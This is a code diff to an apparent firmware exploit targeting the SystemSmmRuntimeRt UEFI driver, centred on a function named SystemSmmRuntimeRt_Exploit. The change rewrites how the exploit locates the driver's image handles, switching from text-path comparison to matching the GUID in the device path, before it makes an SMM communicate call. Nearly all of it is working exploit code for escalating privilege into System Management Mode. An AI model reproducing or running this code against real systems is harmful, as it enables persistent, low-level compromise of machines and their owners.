@@ -25,7 +25,10 @@
 #include "hexdump.h"
 
 // image name for SystemSmmRuntimeRt UEFI driver
-#define IMAGE_NAME L"FvFile(7C79AC8C-5E6C-4E3D-BA6F-C260EE7C172E)"
+#define IMAGE_NAME {	\
+	0x7C79AC8C, 0x5E6C, 0x4E3D,	\
+	{ 0xBA, 0x6F, 0xC2, 0x60, 0xEE, 0x7C, 0x17, 0x2E }	\
+}
 
 // SMM communication data size
 #define BUFF_SIZE 0x1000
@@ -81,8 +84,17 @@ VOID SmmHandler(VOID *Context, VOID *Unknown, VOID *Data)
     }
 }
 //--------------------------------------------------------------------------------------
-EFI_STATUS GetImageHandle(CHAR16 *TargetPath, EFI_HANDLE *HandlesList, UINTN *HandlesListLength)
+EFI_STATUS GetFvImageHandle(const EFI_GUID *Name, EFI_HANDLE *HandlesList, UINTN *HandlesListLength)
 {
+    static const EFI_DEVICE_PATH_PROTOCOL Header = {
+        .Type = MEDIA_DEVICE_PATH,
+        .SubType = MEDIA_PIWG_FW_FILE_DP,
+        .Length = {
+            sizeof(MEDIA_FW_VOL_FILEPATH_DEVICE_PATH) & 0xFF,
+            sizeof(MEDIA_FW_VOL_FILEPATH_DEVICE_PATH) >> 8
+        }
+    };
+
     EFI_HANDLE *Buffer = NULL;
     UINTN BufferSize = 0, HandlesFound = 0, i = 0;    
 
@@ -127,11 +139,10 @@ EFI_STATUS GetImageHandle(CHAR16 *TargetPath, EFI_HANDLE *HandlesList, UINTN *Ha
                 &gEfiLoadedImageProtocolGuid, 
                 (VOID *)&LoadedImage) == EFI_SUCCESS)
             {
-                // get and check image path
-                CHAR16 *Path = ConvertDevicePathToText(LoadedImage->FilePath, TRUE, TRUE);
-                if (Path)
-                {                            
-                    if (!wcscmp(Path, TargetPath))
+                if (!memcmp(LoadedImage->FilePath, &Header, sizeof(Header)))
+                {
+                    if (!memcmp(&((MEDIA_FW_VOL_FILEPATH_DEVICE_PATH *)LoadedImage->FilePath)->FvFileName,
+                                Name, sizeof(*Name)))
                     {
                         if (HandlesFound + 1 < *HandlesListLength)
                         {
@@ -144,13 +155,6 @@ EFI_STATUS GetImageHandle(CHAR16 *TargetPath, EFI_HANDLE *HandlesList, UINTN *Ha
                             // handles list is full
                             Status = EFI_BUFFER_TOO_SMALL;
                         }
-                    }
-
-                    gBS->FreePool(Path);                                        
-
-                    if (Status != EFI_SUCCESS)
-                    {
-                        break;
                     }
                 }
             }
@@ -247,6 +251,7 @@ EFI_STATUS Communicate(EFI_SMM_BASE_PROTOCOL *SmmBase, EFI_HANDLE CallbackHandle
 //--------------------------------------------------------------------------------------
 EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
 {
+    static const EFI_GUID Name = IMAGE_NAME;
     EFI_STATUS Status = EFI_SUCCESS;    
     EFI_SMM_BASE_PROTOCOL *SmmBase = NULL;  
 
@@ -277,7 +282,7 @@ EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
     }
 
     printf("Buffer for SMM communicate call is allocated at 0x%llx\n", Data);    
-    printf("Obtaining %S image handles...\n", IMAGE_NAME);
+    printf("Obtaining SystemSmmRuntimeRt image handles...\n");
 
     /*
         Obtain image handle, SystemSmmRuntimeRt UEFI driver registers sub_A54() as 
@@ -285,7 +290,7 @@ EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
         We can determinate this handle value using LocateHandle() function of
         EFI_BOOT_SERVICES.
     */
-    if (GetImageHandle(IMAGE_NAME, HandlesList, &HandlesListLength) == EFI_SUCCESS)
+    if (GetFvImageHandle(&Name, HandlesList, &HandlesListLength) == EFI_SUCCESS)
     {
         if (HandlesListLength > 0)
         {
